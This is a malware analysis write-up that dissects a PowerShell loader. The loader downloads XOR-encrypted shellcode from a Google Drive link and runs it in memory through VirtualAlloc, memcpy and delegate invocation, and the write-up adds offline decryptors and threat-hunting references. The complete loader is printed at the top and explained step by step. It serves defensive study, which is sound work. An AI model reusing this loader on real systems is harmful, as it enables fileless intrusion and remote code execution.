# PowerShell - In-Memory Shellcode Injection/Execution With Fileless DLLs Reflective Loading

There is another PowerShell command launched:
```powershell
$s = {try {$a = 'System.Con'; $b = 'vert'; $c= [Type]::GetType($a + $b); $d = $c::('From' + 'Base64' + 'String'); $u = 'https://drive.google.com/uc?export=download&id=<stripped>'; $k = 0x5A; $w = New-Object Net.WebClient; $f = $w.DownloadString($u); $e = $d.Invoke($f); for ($i = 0; $i -lT $e.Length; $i++) {$e[$i] = $e[$i] -bxor $k}; $n = 'using System;using System.Runtime.InteropServices;public class N{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); [DllImport("msvcrt.dll", CallingConvention=CallingConvention.Cdecl)]public static IntPtr memcpy(IntPtr d, byte[] s, int c); [UnmanagedFunctionPointer(CallingConvention StdCall)]public delegate uint R();}';Add-Type $n -EA SilentlyContinue; $m = [N]::VirtualAlloc([IntPtr]::Zero, $e.Length, 0x1000, 0x40); [N]::memcpy($m,$e,$e.Length) | Out-Null; $r = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer ($m,[N+R]); $r.Invoke()} catch{}}; Start-Job -ScriptBlock $s | Out-Null
```
Google Drive link contained a file named `170-x64-2.txt`.

This command stores the whole malicious logic in a scriptblock `$s`. `Start-Job` runs it in the background and `catch{}` swallows errors so it fails silently.

It builds `System.Convert` to evade signatures by concatenation and `[Type]::GetType("System.Convert")` returns the **.NET Type object** for `System.Convert`.

It downloads the payload from Google Drive as a plaintext, explicit base64 encoded plaintext. The format of the link is used to force download. 

It loops over every bytes of the plaintext received and XORs each using `0x5A` (`-bxor`) to decrypt the real payload. `-lT` is equivalent to `-lt` and is "less than".

Then, it defines and invokes helpers (C# injected at runtime). Specifically, `Add-Type` compiles the C# into the PowerShell process, then, it exposes a class `N` with:
- `VirtualAlloc` from `kernel32` to allocate memory pages which are RWX memory regions.
- `memcpy` from `msvcrt.dll` to copy payload bytes into that allocated memory.
- Delegate type `R` represents a function pointer that can be called from .NET and `StdCall` calling convention, returns `uint`.

This is a classic .NET/PowerShell bridge to execute raw code. This combination of "VirtualAlloc + memcpy + delegate invoke" pattern is documented as a PowerShell shellcode execution technique.

Some links on malwares using reflective dlls loading:
- https://blog.cerbero.io/powershell-malware-with-x64-shellcode/
- https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html
- https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html

Some links on reflective DLL injection and code loading:
- https://trustedsec.com/blog/loading-dlls-reflections
- https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620
- https://github.com/stephenfewer/ReflectiveDLLInjection

Indeed, it allocates RWX memory, copy bytes and then executes. `VirtualAlloc(..., 0x1000, 0x40)`:
- `0x1000` = `MEM_COMMIT`
- `0x40` = `PAGE_EXECUTE_READWRITE` (RWX)

The pointer is converted into a callable delegate and calls it. The shellcode runs inside the job's PowerShell process.

PowerShell is built on top of the .NET framework, so using .NET from a PowerShell script is basically "native mode" for Windows scripting. Attackers lean on it because it gives them a full programming/runtime toolbox without dropping extra binaries.

In fact, PowerShell can call .NET directly (no extra dependencies). PowerShell runs on the CLR and can call .NET classes like `System.Convert` with one-liners like the one for this malware.

.NET framework is built on C#, so, PowerShell can compile and load C# code at runtime using `Add-Type`, and that C# can use `[DllImport]` to call Win32 APIs (P/Invoke) from the script.
See https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke.
This is exactly what this malware is doing and this is precisely how the malware is reaching for `VirtualAlloc` (kernel32) to allocate executable memory and `memcpy` (msvcrt) to copy bytes. This is a common fileless technique as the heavy lifting (Win32) happens in-memory, orchestrated by the script.

With .NET interop (`Marshal.GetDelegateForFunctionPointer`), the script can treat a memory pointer as a callable function and jump into it. That's the "execute shellcode" step. This avoids dropping a separate payload to disk, which can reduce detection.

> They used .NET because PowerShell is already a .NET host, and .NET gives them easy decoding/decryption utilities and a clean path to call Win32 APIs and execute memory-resident payloads.

In other words, the attack consists of this:
> It downloads some hidden machine code, puts it into memory, then tricks PowerShell/.NET into treating that memory address like a normal function and calls it so the machine code runs.

What is meant by a callable pointer ?
In Windows / C / low-level land, code is just bytes in memory. If the address of these bytes is known, then the code can jump to those bytes and the CPU can start executing them. A pointer is just an address in memory and a callable pointer means that this address is treated as the start of a function and it is called.
It is possible to do this in C directly using function pointers. PowerShell cannot directly jump to memory, so it uses .NET interop to do it.

In the code, `$m` is an IntPtr, a pointer to an address that is executable. Code can be put there and run. The bytes of the decrypted payload are copied there. Now, `$m` contains raw machine instructions.

This is where the pointer is turned into a callable object:
```powershell
$r = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[N+R]);
```
- `$m` is where the code lives.
- `[N+R]` = a delegate type (a signature) defined earlier in the embedded C#:
```csharp
[UnmanagedFunctionPointer(CallingConvention StdCall)]
public delegate uint R();
```
That delegate type says: "the thing at this address is a function that takes no arguments and returns a uint, and uses StdCall calling convention." So, `GetDelegateForFunctionPointer` creates a .NET object (`$r`) that behaves like a normal callable function, but internally it points to `$m`.

Then, it calls it (jumps into the injected bytes):
```powershell
$r.Invoke()
```
This executes the bytes at address `$m`. If those bytes are shellcode, the shellcode runs because the CPU jumps at that address and runs it.

.NET uses the delegate type `[N+R]` because it needs to know how to call the function (how many arguments, what types, the calling conventions, the return type), else, .NE T wouldn't know how to set up the stack/registers properly.

At no point does this loader do something like:
- `Out-File payload.exe`
- `WriteAllBytes("C:\...\payload.exe", ...)`
- `Start-Process payload.exe`
- `rundll32 something.dll`

So the code that actually runs (the decrypted bytes) can execute without ever being stored as a PE file on disk, which is why it is called "fileless".
- The stage that runs the decrypted payload is memory-only execution (in-memory shellcode execution).
- The persistence observed is not fileless. It references a `.ps1` on disk and registry keys.
- The network fetch in the original code is in-memory because it uses `DownloadString` and not `OutFile` which writes to disk.
- However, PowerShell logging can write artifacts (depending on settings) such as Script Block logging, module logging, transcription and Windows or security products may create temp files, AMSI traces, WER crash dumps, prefetch entries, etc.

What is meant by "reflective loader" ? The term "reflective" originates from the technique's core mechanism: the malware contains its own loader, often referred to as a "reflective loader", which is responsible for mapping the malicious code into memory, resolving dependencies, applying relocations, and executing the payload, all without using standard Windows APIs like `LoadLibrary`. This self-contained loader "reflects" the process of loading itself, effectively allowing the DLL or executable to load and initialize itself in memory, mimicking the behavior of a legitimate DLL but without any file on disk.

## PowerShell Decryptor

```powershell
# Input: the Base64 text file extracted (e.g. 170-x64-2.txt)
$b64 = Get-Content .\170-x64-2.txt -Raw
$buf = [Convert]::FromBase64String($b64)

for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = $buf[$i] -bxor 0x5A }

[IO.File]::WriteAllBytes(".\decrypted.bin", $buf)
```

## Python Decryptor

If `downloaded.bin` is Base64 text, it can be decoded to raw bytes offline and then XOR.

Here’s a non-executing Python decoder that writes the decrypted payload to disk but does not run it:
```python
import base64, pathlib 
b64 = pathlib.Path("downloaded.bin").read_text(errors="ignore").strip()
enc = base64.b64decode(b64)
dec = bytes([b ^ 0x5A for b in enc])
pathlib.Path("stage2.bin").write_bytes(dec)
print("Wrote stage2.bin, size =", len(dec))
```

Then:
```sh
file stage2.bin
strings -a stage2.bin | head
```

## Threat Hunting

> https://attack.mitre.org/techniques/T1620/
> 
> https://stonefly.com/blog/netwalker-ransomware-fileless-malware-recovery/
> 
> https://www.cynet.com/attack-techniques-hands-on/netwalker-ransomware-report/
